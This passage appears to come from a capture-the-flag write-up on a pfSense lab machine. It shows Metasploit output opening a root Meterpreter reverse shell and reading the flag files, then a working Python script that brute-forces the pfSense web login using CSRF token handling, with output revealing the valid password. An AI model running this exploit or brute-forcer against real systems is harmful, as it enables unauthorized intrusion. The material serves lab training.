[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[*] Sending stage (37775 bytes) to 10.10.10.60
[*] Meterpreter session 1 opened (10.10.14.16:4444 -> 10.10.10.60:20197) at 2018-06-25 15:52:56 -0400
[+] Deleted hWBJgCo


meterpreter >
meterpreter > getuid
Server username: root (0)
meterpreter > cat /root/root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86
meterpreter > cat /home/rohit/user.txt
8721327cc232073b40d27d9c17e7348b
meterpreter >
```

###### Python Login Brute Force

`pfsense-login-bruteforce.py`

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

re_csrf = 'csrfMagicToken = "(.*?)"'

s = requests.session()

lines = open('passwords.txt')
for password in lines:
	r = s.post('http://127.0.0.1/index.php')
	csrf = re.findall(re_csrf, r.text)[0]
	login = {'__csrf_magic': csrf, 'usernamefld': 'rohit', 'passwordfld': password[:-1], 'login': 'Login'}
	r = s.post('http://127.0.0.1/index.php', data=login)
	if "Dashboard" in r.text:
		print("Valid Login %s:%s" % ("rohit", password[:-1]))
	else:
		print("Failed %s:%s" % ("rohit", password[:-1]))
		s.cookies.clear()
```

```sh
root@kali:~/sense# cat passwords.txt
password1
password2
password3
pfsense
root@kali:~/sense#
```

![](images/34.png)

![](images/35.png)

```sh
root@kali:~/sense# python3 pfsense-login-bruteforce.py
Failed rohit:password1
Failed rohit:password2
Failed rohit:password3
Valid Login rohit:pfsense
root@kali:~/sense#
```